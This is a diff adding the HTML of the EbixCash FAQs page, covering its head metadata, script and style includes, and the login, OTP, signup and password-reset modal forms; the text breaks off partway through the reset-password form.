@@ -1,0 +1,4431 @@
+
+<!doctype html>
+<html lang="en">
+    <!-- header top start here -->
+    
+
+<meta charset="utf-8">
+<meta content="width=device-width,initial-scale=1" name="viewport">
+<link rel="apple-touch-icon" sizes="57x57" href="/static/Common/img/favicon/apple-icon-57x57.png">
+<link rel="apple-touch-icon" sizes="60x60" href="/static/Common/img/favicon/apple-icon-60x60.png">
+<link rel="apple-touch-icon" sizes="72x72" href="/static/Common/img/favicon/apple-icon-72x72.png">
+<link rel="apple-touch-icon" sizes="76x76" href="/static/Common/img/favicon/apple-icon-76x76.png">
+<link rel="apple-touch-icon" sizes="114x114" href="/static/Common/img/favicon/apple-icon-114x114.png">
+<link rel="apple-touch-icon" sizes="120x120" href="/static/Common/img/favicon/apple-icon-120x120.png">
+<link rel="apple-touch-icon" sizes="144x144" href="/static/Common/img/favicon/apple-icon-144x144.png">
+<link rel="apple-touch-icon" sizes="152x152" href="/static/Common/img/favicon/apple-icon-152x152.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/static/Common/img/favicon/apple-icon-180x180.png">
+<link rel="icon" type="image/png" sizes="192x192" href="/static/Common/img/favicon/android-icon-192x192.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/static/Common/img/favicon/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="96x96" href="/static/Common/img/favicon/favicon-96x96.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/static/Common/img/favicon/favicon-16x16.png">
+<link rel="manifest" href="/static/Common/img/favicon/manifest.json">
+<meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large"/>
+
+    <!-- header top end here -->
+    <link rel="canonical" href="https://ebixcash.com/faqs/"/>
+    <meta property="og:locale" content="en_US" />
+    <meta property="og:type" content="Website" />
+    <meta property="og:title" content="FAQs at Ebixcash, FAQs on Money Transfers, Bill payments, Recharge, Tours & Travels." />
+    <meta property="og:description" content="Find out all your queries here related to EbixCash. You will get answers from EbixCash Wallet, Bill Payment, Recharge, Gift card, and Prepaid card." />
+    <meta property="og:site_name" content="EbixCash" />
+    <meta property="og:url" content="https://ebixcash.com/faqs/" />
+    <meta property="og:image" content="https://ebixcash.com/static/Common/img/og-image.jpg"/>
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="FAQs at Ebixcash, FAQs on Money Transfers, Bill payments, Recharge, Tours & Travels." />
+    <meta name="twitter:description" content="Find out all your queries here related to EbixCash. You will get answers from EbixCash Wallet, Bill Payment, Recharge, Gift card, and Prepaid card." />
+    <meta name="twitter:image" content="/static/Common/img/og-image.jpg"/>
+    <title>FAQs at Ebixcash, FAQs on Money Transfers, Bill payments, Recharge, Tours & Travels.</title>
+    <meta name="description" content="Find out all your queries here related to EbixCash. You will get answers from EbixCash Wallet, Bill Payment, Recharge, Gift card, and Prepaid card." />
+    <meta name="keyword" content="FAQ, Queries, Payment related queries" />
+
+
+    <!-- header_bottom start here -->
+    
+
+
+
+<!-- Bootstrap CSS -->
+<!-- <link rel="stylesheet" href="/static/Common/css/bootstrap.min.css" type="text/css" /> -->
+<link rel="preload" href="/static/Common/css/main.css" as="style">
+<link rel="stylesheet" href="/static/Common/css/main.css" type="text/css" />
+<link rel="preload" href="/static/Common/css/owl.carousel.css" as="style">
+<link rel="stylesheet" href="/static/Common/css/owl.carousel.css" type="text/css" />
+<link rel="preload" href="/static/Common/css/jquery.mCustomScrollbar.min.css" as="style">
+<link rel="stylesheet" href="/static/Common/css/jquery.mCustomScrollbar.min.css" type="text/css" />
+<link rel="preload" href="/static/Common/css/isotope.css" as="style">
+<link rel="stylesheet" href="/static/Common/css/isotope.css" type="text/css" />
+<link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/font-awesome.min.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/font-awesome.min.css">
+<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/daterangepicker/daterangepicker.css" />
+<link  rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-datepicker/1.3.0/css/datepicker.css"/>
+
+<link href = "https://code.jquery.com/ui/1.13.2/themes/ui-lightness/jquery-ui.css" rel = "stylesheet">
+
+<!-- Bootstrap Icons -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.7.2/font/bootstrap-icons.css">
+
+<!-- Data Table -->
+<link href="https://cdn.datatables.net/1.10.20/css/dataTables.bootstrap4.min.css" rel="stylesheet"
+        crossorigin="anonymous" />
+
+
+<!-- Leaflet css -->
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css"
+integrity="sha512-xodZBNTC5n17Xt2atTPuE1HxjVMSvLVW9ocqUKLsCC5CXdbqCmblAshOMAS6/keqq/sMZMZ19scR4PsZChSR7A=="
+crossorigin=""/>
+<link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster@1.4.1/dist/MarkerCluster.css"/>
+<link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster@1.4.1/dist/MarkerCluster.Default.css"/>
+<!-- Leaflet's JS Make sure you put this AFTER Leaflet's CSS -->
+
+<script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+<!--<script src="/static/Common/js/jquery-3.6.0.min.js"></script> -->
+
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+  new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+  j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+  'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+  })(window,document,'script','dataLayer','GTM-KNFDJH2');</script>
+  <!-- End Google Tag Manager -->
+    <!-- header_bottom end here -->
+
+
+<body class="home">
+  <!-- login&Signup start here -->
+  
+<!--login start here -->
+
+
+<div class="modal fade" id="login" tabindex="-1" role="dialog" aria-labelledby="login" aria-hidden="true">
+
+  <div class="modal-dialog   modal-dialog-centered modal-dialog-scrollable" role="document">
+    <div class="modal-content">
+      <div class="modal-header">
+        <div class="w-100 d-flex justify-content-between align-items-center">
+          <h5 class="modal-title w-auto" style="font-size: 20px;" id="loginTitle">Consumer login</h5>
+          <span style="width: 1px; height: 20px; background-color: #ccc;"></span>
+          <div class="p-0 align-items-center d-none d-md-flex">
+            <i class="fas fa-wallet text-pink me-2"></i>
+            
+            <span class="wallettitle text-secondary">Ebixcash Wallet</span>
+
+          </div>
+        </div>
+      <!--  <button type="button" class="close" data-bs-dismiss="modal" aria-label="Close"> <span
+            aria-hidden="true">&times;</span> </button>-->
+      </div>
+
+      <div class="modal-body">
+        <div id="successmessage mb-3"></div>
+        <div class="row justify-content-md-center">
+          <div class="col-md-12">
+            <form method="POST" id='loginform'>
+              <input type="hidden" name="csrfmiddlewaretoken" value="bBmXmIeOGjGBqbnbbiweQ21HXwPF9MoBDA8X3LXl5Lud1P2Sljo2ugTG6WVB05QS">
+              <div class="form-group mb-3">
+                <div id="message"></div>
+                <input type="hidden" id="logincalledfrom" name="logincalledfrom">
+                <input type="text" class="form-control" id="username" placeholder="Enter Mobile Number"
+                  name="username" autocomplete="off" required>
+              </div>
+              <div class="form-group mb-3">
+                <div class="input-group mb-2">
+                  <input type="password" class="form-control togglelogin" id="loginPwd" placeholder="Password"
+                    name="password" autocomplete="off" required>
+                  <input type="hidden" id="encryptloginPwd" name="encryptloginPwd" value="">
+                  <div class="input-group-prepend">
+                    <div class="input-group-text" style="height:50px; margin-left:-8px;"><i class="fas fa-eye-slash toggle-password-login"></i></div>
+                  </div>
+                </div>  
+                <p class="termsline text-danger" >*Do not share your password and OTP with anyone.</p>
+              </div>
+              <div class="form-group  mb-3">
+                <div class="row">
+                <div class="col-6 position-relative" id="captchaimg">
+                  <img id="login_captcha_img" src="data:image/png;base64," alt=""  style="width: 100%; height: 50px;" />                  
+                  <a id="refresh_captcha" name="refresh_captcha" href="#"><img src="/static/Common/img/refresh.svg" width="18" loading="lazy" alt="icons" style="position: absolute; right: -6px; top:29px; cursor: pointer;" ></a>
+                </div>
+                <div class="col-6">
+                  <input type="text" name="usercaptcha" class="form-control" minlength="4" maxlength="4" placeholder="Please Enter captcha" required>
+                </div>
+              </div>
+            </div>
+            <div class="form-group align-items-center mb-3">
+              <div class="row">
+              <div class="col-6">
+                <button type="submit" id="loginbtn" class="custmbtn btn btn-primary btn-block">LOGIN</button>
+              </div>
+              <div class="col-6 text-end">
+                <a data-bs-toggle="modal" href="#forgotpwd" id="forgotpwdbtn"
+                  data-bs-dismiss="modal">Forgot Password?</a>
+              </div>
+            </div>
+          </div>
+              <p class="text-center termsline">By logging In, you agree to our <a href="/terms/"
+                  target="_blank">Terms & Conditions</a> & <a href="
+                  /privacy/" target="_blank"> Privacy Policy</a>.</p>
+
+             <!-- <p class="text-center termsline"><strong class="h4 text-danger">OR</strong> <br> <a id="loginotpnew" data-toggle="modal" href="#loginotp" class="text-decoration-underline text-secondary" data-bs-dismiss="modal"><u>Login with OTP</u></a></p>-->
+             <hr>
+
+              <div class="row">
+
+                <div class="col-6"><a href="/other-cards/" target="_blank"
+                    class="btn btn-block btn-light">Other Card Login</a></div>
+
+                <div class="col-6"><a href="/partner-login/" target="_blank"
+                    class="btn btn-block btn-light">Partner Login</a></div>
+
+              </div>
+            </form>
+          </div>
+        </div>
+      </div>
+      <div class="modal-footer text-center">
+        <p class="text-center">New to Ebixcash? <a data-bs-toggle="modal" href="#signup" id="signupanchor"
+            data-bs-dismiss="modal">SIGNUP</a></p>
+      </div>
+    </div>
+  </div>
+</div>
+<!--login end here -->
+
+<!--login otp here -->
+<div class="modal fade" id="loginotp" tabindex="-1" role="dialog" aria-labelledby="loginotp" aria-hidden="true">
+
+  <div class="modal-dialog   modal-dialog-centered " role="document">
+    <div class="modal-content">
+      <div class="modal-header">
+        <div class="w-100 d-flex justify-content-between align-items-center">
+          <h5 class="modal-title w-auto" style="font-size: 20px;" id="loginTitle">Consumer login</h5>
+          <span style="width: 1px; height: 20px; background-color: #ccc;"></span>
+          <div class="p-0 align-items-center d-none d-md-flex">
+            <i class="fas fa-wallet text-pink mr-2"></i>
+            
+            <span class="wallettitle text-secondary">Ebixcash Wallet</span>
+
+          </div>
+        </div>
+        <button type="button" class="close" data-bs-dismiss="modal" aria-label="Close"> <span
+            aria-hidden="true">&times;</span> </button>
+      </div>
+
+      <div class="modal-body">
+        <div id="successmessage mb-3"></div>
+        <div class="row justify-content-md-center">
+          <div class="col-md-12">
+            <form  >
+ <p class="text-center">Enter your 10 digits mobile Number</p>
+              <div class="form-group">
+                <input type="text" class="form-control" id="username" placeholder="+91 - " name="username" autocomplete="off">
+              </div>
+
+           
+            <div class="form-group row align-items-center">
+              <div class="col-12 text-center">
+                <a class="custmbtn btn btn-primary px-5 pt-3 text-white" data-bs-toggle="modal" id="sendoptnew" href="#mobileotp"  data-bs-dismiss="modal"><span class="px-5">Send OTP</span></a>
+              </div>
+
+        
+     
+         
+            </div>
+              <p class="text-center termsline mt-5">By logging In, you agree to our <a href="/terms/" target="_blank">Terms &amp; Conditions</a> &amp; <a href="/privacy/" target="_blank"> Privacy Policy</a>.</p>
+
+              <p class="text-center termsline"><strong class="h4 text-danger">OR</strong> <br> <a  href="#login" data-bs-toggle="modal" class="text-decoration-underline text-secondary" data-bs-dismiss="modal"><u>Login with Password?</u></a></p>
+     
+
+              <div class="row">
+
+                <div class="col-6"><a href="/other-cards/" target="_blank" class="btn btn-block btn-light">Other Card Login</a></div>
+
+                <div class="col-6"><a href="/partner-login/" target="_blank" class="btn btn-block btn-light">Partner Login</a></div>
+
+              </div>
+            </form>
+          </div>
+        </div>
+      </div>
+      <div class="modal-footer text-center">
+        <p class="text-center">New to Ebixcash? <a data-bs-toggle="modal" href="#signup" id="signupanchor"
+            data-bs-dismiss="modal">SIGNUP</a></p>
+      </div>
+    </div>
+  </div>
+</div>
+<!--login otp end here -->
+
+
+<!--Mobile otp here -->
+<div class="modal fade" id="mobileotp" tabindex="-1" role="dialog" aria-labelledby="mobileotp" aria-hidden="true">
+
+  <div class="modal-dialog modal-dialog-centered" role="document">
+    <div class="modal-content">
+      <div class="modal-header">
+        <button type="button" class="close" data-bs-dismiss="modal" aria-label="Close"> <span
+          aria-hidden="true">&times;</span> </button>
+
+        <div class="w-100 d-flex justify-content-between align-items-center">
+          <h5 class="modal-title w-auto" style="font-size: 20px;" id="loginTitle">Consumer login</h5>
+          <span style="width: 1px; height: 20px; background-color: #ccc;"></span>
+          <div class="p-0 align-items-center d-none d-md-flex">
+            <i class="fas fa-wallet text-pink mr-2"></i>
+            
+            <span class="wallettitle text-secondary">Ebixcash Wallet</span>
+
+          </div>
+        </div>
+
+      </div>
+
+      <div class="modal-body">
+        <div class="row justify-content-md-center">
+          <div class="col-md-12">
+            <form method="POST" >
+ <p class="text-center">Enter 4 digits OTP</p>
+              <div class="form-group">
+                <div class="row px-5">
+                <div class="col-md-3">  <input type="text" class="form-control" placeholder="" name="username" autocomplete="off" required=""></div>
+                  <div class="col-md-3"><input type="text" class="form-control" placeholder="" name="username" autocomplete="off" required=""></div>
+                <div class="col-md-3"> <input type="text" class="form-control" placeholder="" name="username" autocomplete="off" required=""></div>
+                <div class="col-md-3"> <input type="text" class="form-control" placeholder="" name="username" autocomplete="off" required=""></div>
+              </div>
+              </div>
+
+           
+            <div class="form-group row align-items-center">
+              <div class="col-12 text-center">
+                <button type="submit" class="custmbtn btn btn-primary px-5"><span class="px-5">Verify OTP</span></button>
+              </div>
+         
+            </div>
+              <p class="text-center termsline mt-5">By logging In, you agree to our <a href="/terms/" target="_blank">Terms &amp; Conditions</a> &amp; <a href="
+                  /privacy/" target="_blank"> Privacy Policy</a>.</p>
+
+              <p class="text-center termsline"><strong class="h4 text-danger">OR</strong> <br> <a  href="#login" data-bs-toggle="modal" class="text-decoration-underline text-secondary" data-bs-dismiss="modal"><u>Login with Password?</u></a></p>
+     
+
+              <div class="row">
+
+                <div class="col-6"><a href="/other-cards/" target="_blank" class="btn btn-block btn-light">Other Card Login</a></div>
+
+                <div class="col-6"><a href="/partner-login/" target="_blank" class="btn btn-block btn-light">Partner Login</a></div>
+
+              </div>
+            </form>
+          </div>
+        </div>
+      </div>
+      <div class="modal-footer text-center">
+        <p class="text-center">New to Ebixcash? <a data-bs-toggle="modal" href="#signup" id="signupanchor"
+            data-bs-dismiss="modal">SIGNUP</a></p>
+      </div>
+    </div>
+  </div>
+</div>
+<!--login otp end here -->
+
+
+<!--signup start here -->
+<div class="modal fade" id="signup" tabindex="-1" role="dialog" aria-labelledby="signup" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-centered modal-dialog-scrollable" role="document">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h5 class="modal-title text-center" id="signupTitle">SIgn up</h5>
+
+        <!--<button type="button" class="close" id="signupclose" data-ds-dismiss="modal" aria-label="Close"> <span
+            aria-hidden="true">&times;</span> </button> -->
+
+      </div>
+      <div class="modal-body ">
+        <div id="registermessageS" class="text-success"></div>
+        <div id="registermessageF" class="text-danger"></div>
+        <form method="POST" id="registerform">
+          <input type="hidden" name="csrfmiddlewaretoken" value="bBmXmIeOGjGBqbnbbiweQ21HXwPF9MoBDA8X3LXl5Lud1P2Sljo2ugTG6WVB05QS">
+
+
+          <div class="form-group mb-3">
+            <input type="text"  pattern="([a-zA-Z]+)( [a-zA-Z]+)*" title="Please enter Alphabets."  class="form-control" placeholder="Enter First Name" name="first_name" id='first_name'
+            oninput="if($('#verify_id_text').text() == '✅ Verified'){$('#verify_id_error').html(''); 
+               $('#verify_id_div').attr('hidden',true); $('#verify_id_text').removeClass('text-success');$('#verify_id_text').text('Verify'); $('#is_verified').val('false')}" required>
+          </div>
+          <div class="form-group mb-3">
+            <input type="text" pattern="([a-zA-Z]+)( [a-zA-Z]+)*" title="Please enter Alphabets."  class="form-control" placeholder="Enter Middle Name" name="middle_name" id='middle_name'
+            oninput="if($('#verify_id_text').text() == '✅ Verified'){$('#verify_id_error').html(''); 
+               $('#verify_id_div').attr('hidden',true); $('#verify_id_text').removeClass('text-success');$('#verify_id_text').text('Verify'); $('#is_verified').val('false')}">
+          </div>
+          <div class="form-group mb-3">
+            <input type="text" pattern="([a-zA-Z]+)( [a-zA-Z]+)*" title="Please enter Alphabets."  class="form-control" placeholder="Enter Last Name" name="last_name" id='last_name'
+            oninput="if($('#verify_id_text').text() == '✅ Verified'){$('#verify_id_error').html(''); 
+               $('#verify_id_div').attr('hidden',true); $('#verify_id_text').removeClass('text-success');$('#verify_id_text').text('Verify'); $('#is_verified').val('false')}">
+          </div>
+          <div class="form-group mb-3">
+            <input type="text" class="form-control" placeholder="Enter Mobile Number" name="mobile_number"
+              id="mobile_number" maxlength="10" minlength="10" onkeyup="return changecolormobile()"
+              onkeypress='return restrictAlphabets(event)' oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*?)\..*/g, '$1');" required>
+          </div>
+          <div class="form-group mb-3">
+            <input type="email" class="form-control" placeholder="Email ID" name="email_id" id="email_id" required>
+          </div>
+          <div class="form-group mb-3">
+            <input type="text" onfocus="(this.type='date')"  name="signup_dob" id="signup_dob" onkeydown="return false"  class="form-control togglelogin" placeholder="DOB" required>
+            <span style="color: crimson;">Note:Minumum age limit is 18 years.<small></small></span>
+          </div>
+          <div class="form-group mb-3">
+            <div class="form-check form-check-inline ps-0">
+              <input type="hidden" name="gender" id="gender" value="" required>
+
+              <input class="form-check-input" type="radio" id="genderM" name="genderA" value="M"
+                onclick="javascript:$('#gender').val('M')">
+              <span></span>
+              <label class="form-check-label">Male</label>
+            </div>
+            <div class="form-check form-check-inline ps-0">
+              <input class="form-check-input" type="radio" id="genderF" name="genderA" value="F"
+                onclick="javascript:$('#gender').val('F')" required>
+              <span></span>
+              <label class="form-check-label">Female</label>
+            </div>
+            <div class="form-check form-check-inline ps-0" style="display: none;">
+              <input class="form-check-input" type="radio" id="genderO" name="genderA" value="O"
+                onclick="javascript:$('#gender').val('O')" required>
+              <span></span>
+              <label class="form-check-label">Other</label>
+            </div>
+          </div>
+          <div class="form-group mb-3">
+            <select name="identity_type" id="identity_type" class="form-control form-select" onchange="$('#verify_id_error').html(''); 
+            $('#verify_id_div').attr('hidden',true); $('#verify_id_text').removeClass('text-success');$('#verify_id_text').text('Verify'); $('#is_verified').val('false')">
+              <option value="" selected>Select Identity Proof</option>
+              <option value="D">Driving License</option>
+              <option value="I">Pan Card</option>
+              <option value="V">Voter Identity Card</option>
+            </select>
+          </div>
+          <div class="form-group position-relative mb-3">
+            <a id="verify_idproof" href="#"><span id="verify_id_text" style="position: absolute; right:20px; top:10px; font-size:14px;color: #17a2b8; z-index: 111;">Verify</span></a>
+            <input type="text" style='text-transform:uppercase' class="form-control" id="identity_number" placeholder="Identity Proof Number"
+               name="identity_number" value="" oninput="if($('#verify_id_text').text() == '✅ Verified'){$('#verify_id_error').html(''); 
+               $('#verify_id_div').attr('hidden',true); $('#verify_id_text').removeClass('text-success');$('#verify_id_text').text('Verify'); $('#is_verified').val('false')}">
+            <input type="hidden" id="is_verified" name="is_verified" value="false">
+            <input type="hidden" id="verified_name" name="verified_name">
+            <input type="hidden" id="verified_idtype" name="verified_idtype">
+            <input type="hidden" id="verified_idnumber" name="verified_idnumber">
+            <input type="hidden" id="ovd_popup_shown" name="ovd_popup_shown" value="false">
+          </div>
+          <div class="form-group mb-3" id="verify_id_div" hidden>
+            <span id="verify_id_error" class="text-danger"></span>
+
+          </div>
+
+          <div class="form-group mb-3">
+            <div class="input-group">
+              <input type="password" class="form-control toggleregpwd" id="reg_pwd" placeholder="Enter Password"
+                name="reg_pwd" onkeyup='check();' required>
+              <div class="input-group-prepend" >
+                <div class="input-group-text" style="height:50px; margin-left:-8px;" id="passeye"><i class="fas fa-eye-slash toggle-password-regpwd"></i></div>
+              </div>
+            </div>
+          </div>
+          <div class="form-group mb-3">
+            <div class="input-group">
+              <input type="password" class="form-control toggleconfregpwd" id="confirmpassword"
+                placeholder="Confirm Password" name="confirmpassword" onkeyup='check();' required>
+              <input type="hidden" id="encryptPwd" name="encryptPwd" value="">
+              <div class="input-group-prepend" >
+                <div class="input-group-text" style="height:50px; margin-left:-8px;" id="confirmeye"><i class="fas fa-eye-slash toggle-password-confreg"></i>
+                </div>
+
+
+              </div>
+            </div>
+
+          </div>
+          <div class="form-group mb-3">
+            <div class="col" id="captchaimgsignup">
+            <img src="data:image/png;base64,"  style="width: 100%; height: 60px;" alt="" />                  
+          </div>
+        </div>
+        <div class="form-group mb-3">
+          <div class="col">
+            <input type="text" name="usercaptchasignup" class="form-control" minlength="4" maxlength="4" placeholder="Please Enter captcha" required>
+          
+          </div>
+        </div>
+          <input type="hidden" name="sms_notifications" id="sms_notifications" value="0">
+          <input type="hidden" name="autoassigncard" id="virtual_asc_card" value="0">
+          <div class="form-group mb-3">
+            <div class="custom-control custom-checkbox">
+              <input class="custom-control-input" type="checkbox" id="sms" name="sms"
+                onclick="javascript:if($(this).is(':checked')) {$('#sms_notifications').val('1')} else{$('#sms_notifications').val('0')}">
+              <label class="custom-control-label" for="sms">I wish to receive SMS Notifications of transactions done
+                with my linked card.</label>
+            </div>
+          </div>
+          <div class="form-group mb-3" style="display: none;">
+            <div class="custom-control custom-checkbox">
+              <input class="custom-control-input" type="checkbox" id="asc_card" name="asc_card"
+                onclick="javascript:if($(this).is(':checked')) {$('#virtual_asc_card').val('1')} else{$('#virtual_asc_card').val('0')}">
+              <label class="custom-control-label" for="asc_card">I would like a virtual ASC card to be sent to me (Do
+                not select this if you already have an All Services Card)</label>
+            </div>
+            <input type="hidden" name="sms_notifications" id="sms_notifications" value="0">
+            <input type="hidden" name="autoassigncard" id="virtual_asc_card" value="0">
+          </div>
+          <div class="form-group mb-3">
+            <div class="custom-control custom-checkbox">
+              <input class="custom-control-input" type="checkbox" value="1" id="read" name="tnc" required>
+              <label class="custom-control-label" for="read">I have read the <strong style="color:#FF0000; font-weight: normal;">*</strong><a
+                  href="/terms/" target="_blank">Terms and Conditions</a> and I
+                Agree.</label>
+            </div>
+          </div>
+          <div class="form-group mb-3">
+            <button class="custmbtn btn btn-primary btn-block" id="btnSignup">SIGN UP</button>
+
+          </div>
+
+          <!-- <div class="or"> <span>OR</span> </div> -->
+          <!-- <div class="loginwith"> <a class="fb" href="#"><i class="fab fa-facebook-f"></i></a> <a class="gp" href="#"><i class="fab fa-google" aria-hidden="true"></i></a> </div> -->
+        </form>
+      </div>
+      <div class="modal-footer">
+        <p>Already have a Ebixcash account? <a data-bs-toggle="modal" href="#login" data-bs-dismiss="modal">LOGIN</a></p>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+
+<!-- OTP verification (b2c only) modal form start here -->
+
+<div class="modal fade" id="otpverify" tabindex="-1" role="dialog" aria-labelledby="otpverify" aria-hidden="true">
+
+  <div class="modal-dialog   modal-dialog-centered modal-dialog-scrollable" role="document">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h5 class="modal-title text-center" id="otpverificationTitle">OTP Verification</h5>
+        <button type="button" class="close" data-bs-dismiss="modal" aria-label="Close"> <span
+            aria-hidden="true">&times;</span> </button>
+      </div>
+
+      <div class="modal-body">
+        <div class="row justify-content-md-center mt-4">
+          <div class="col-md-11">
+            <form method="POST" id='otpverifyform'>
+              <input type="hidden" name="csrfmiddlewaretoken" value="bBmXmIeOGjGBqbnbbiweQ21HXwPF9MoBDA8X3LXl5Lud1P2Sljo2ugTG6WVB05QS">
+              <div class="form-group">
+                <div class="text-danger" id="otpmessage"></div>
+                <input type="hidden" id="Omobile" name="Omobile" value="">
+                <input type="hidden" id="Oemail" name="Oemail" value="">
+                <input type="hidden" id="OencryptPwd" name="OencryptPwd" value="">
+                <input type="hidden" id="Ofirst_name" name="Ofirst_name" value="">
+                <input type="hidden" id="Omiddle_name" name="Omiddle_name" value="">
+                <input type="hidden" id="Olast_name" name="Olast_name" value="">
+                <input type="hidden" id="Ogender" name="Ogender" value="">
+                <input type="hidden" id="Osms_notifications" name="Osms_notifications" value="">
+                <input type="hidden" id="Oautoassigncard" name="Oautoassigncard" value="">
+                <input type="hidden" id="Oidentity_type" name="Oidentity_type" value="">
+                <input type="hidden" id="Oidentity_number" name="Oidentity_number" value="">
+
+                <input type="text" class="form-control" id="mobileforotp" name="mobileforotp" disabled>
+              </div>
+              <div class="form-group">
+                <div class="input-group mb-2">
+                <input type="password" class="form-control togglemobile" id="mobileotp" placeholder="Enter Mobile OTP" name="mobileotp" maxlength="6" minlength="6" onkeypress='return restrictAlphabets(event)'>
+                <div class="input-group-prepend">
+                  <div class="input-group-text"><i class="fas fa-eye-slash toggle-pasword-mobileotp"></i>
+                  </div>
+                  </div>
+                  </div>
+              </div>
+              <div class="form-group mb-3">
+                <p class="text-right mb-2"><a id="b2cmobsignupotp" class="resendotpc" onclick="signup_resendotp('mobileforotp')">Resend OTP</a></p>
+                <p id="displaysignupotp"></p>
+              </div>
+
+              <div class="form-group mb-3">
+                <input type="text" class="form-control" id="emailforotp" name="emailforotp" disabled>
+              </div>
+              <div class="form-group mb-3">
+                <div class="input-group mb-2">
+                  <input type="password" class="form-control toggleemail" id="emailotp" placeholder="Enter Email OTP" name="emailotp" maxlength="6" minlength="6" onkeypress='return restrictAlphabets(event)'>
+                <div class="input-group-prepend">
+                  <div class="input-group-text"><i class="fas fa-eye-slash toggle-password-emailotp"></i>
+                  </div>
+                </div>
+                </div>
+              </div>
+            <div class="form-group mb-3">
+              <p class="text-right mb-2"><a id="b2csignupeotp" class="resendotpc" onclick="signup_resendotp('emailforotp')">Resend OTP</a></p>
+              <p id="displaysignupotp"></p>
+            </div>
+
+              <div class="form-group">
+                <button type="submit" id="otpverifybtn" class="custmbtn btn btn-primary btn-block">Verify</button>
+              </div>
+            </form>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- OTP verification modal (b2c only) form end here -->
+
+<!-- Forgot Password modal form start here -->
+
+<div class="modal fade" id="forgotpwd" tabindex="-1" role="dialog" aria-labelledby="forgotpwd" aria-hidden="true" >
+
+  <div class="modal-dialog   modal-dialog-centered" role="document">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h5 class="modal-title text-center" id="forgotpwdTitle">Reset Password</h5>
+        <button type="button" class="close" data-bs-dismiss="modal" aria-label="Close"> <span
+            aria-hidden="true">&times;</span> </button>
+      </div>
+
+      <div class="modal-body">
+        <div class="row justify-content-md-center mt-4">
+          <div class="col-md-11">
+            <form method="POST" id='forgotpwdform'>
+              <input type="hidden" name="csrfmiddlewaretoken" value="bBmXmIeOGjGBqbnbbiweQ21HXwPF9MoBDA8X3LXl5Lud1P2Sljo2ugTG6WVB05QS">
+              <div class="form-group mb-3">
+                <div id="forgotpwdmessage"></div>
+                <input type="text" class="form-control" id="mobileforgot" placeholder="Enter Mobile Number"
+                  name="mobileforgot" maxlength="10" minlength="10" onkeyup="return forgotmobsubmitbtn()"
+                  onkeypress='return restrictAlphabets(event)' required>
+              </div>
+              <div class="form-group">
+                <button type="submit" id="forgotsubmmitbtn" class="custmbtn btn btn-primary btn-block"
+                  disabled>Submit</button>
+                  
+              </div>
+            </form>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Forgot Password modal form end here -->
+
+<!-- Validate Password modal form start here -->
+
+<div class="modal fade" id="validateforgotpwd" tabindex="-1" role="dialog" aria-labelledby="validateforgotpwd"
+  aria-hidden="true">
+
+  <div class="modal-dialog   modal-dialog-centered modal-dialog-scrollable" role="document">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h5 class="modal-title text-center" id="validateforgotpwdTitle">Reset Password</h5>
+       <!-- <button type="button" class="close" data-bs-dismiss="modal" aria-label="Close"> <span
+            aria-hidden="true">&times;</span> </button>-->
+      </div>
+
+      <div class="modal-body">
+        <div class="row justify-content-md-center mt-4">
+          <div class="col-md-11">
+            <form method="POST" id='validateforgotpwdform'>
+              <input type="hidden" name="csrfmiddlewaretoken" value="bBmXmIeOGjGBqbnbbiweQ21HXwPF9MoBDA8X3LXl5Lud1P2Sljo2ugTG6WVB05QS">
+              <div id="verifyforgotpwdmessage"></div>
+              <input type="hidden" id="validatemobileforgot" name="validatemobileforgot" value="">
+              <input type="hidden" name="resetCheckUser" id="resetCheckUser" value="">
+              <div class="form-group mb-2">
+                <input type="text" class="form-control" id="viewmobile" placeholder="Enter Mobile Number"
+                  name="viewmobile" disabled>
+              </div>
+              <div class="form-group">
+                  <div class="input-group mb-2">
+                <input type="password" class="form-control toggleotp" minlength="6" maxlength="6" id="otpforgot"
+                  placeholder="Enter OTP" name="otpforgot" >
+                  <div class="input-group-prepend" >
+                      <div class="input-group-text" style="height: 50px; margin-left: -8px;"><i class="fas fa-eye-slash toggle-password-otp"></i>
+                      </div>
+                    </div>
+                  </div>
+              </div> 
+
+            <div class="form-group">
+              <p class="text-right mb-2"><a id="mobrsendotp1" class="resendotpc" onclick="resendotp('viewmobile')">Resend OTP</a></p>
+              <p id="displaymsg"></p>
+            </div>
+              
+              <div class="form-group">
+                <div class="input-group mb-2">
+                  <input type="password" class="form-control toggleforgotpwd" minlength="6" id="passwordforgot"
+                    onkeyup="return submitbtnforgot()" placeholder="Enter New Password" name="passwordforgot" >
+                  <div class="input-group-prepend">
+                    <div class="input-group-text"   style="height: 50px; margin-left: -8px;"><i class="fas fa-eye-slash toggle-password-newforgotpwd"></i></div>
+                  </div>
+                </div>
+              </div>
+              <div class="form-group">
+                <div class="input-group mb-2">
+                  <input type="password" class="form-control toggleconfirmforgotpwd" id="confirmpwdforgot"
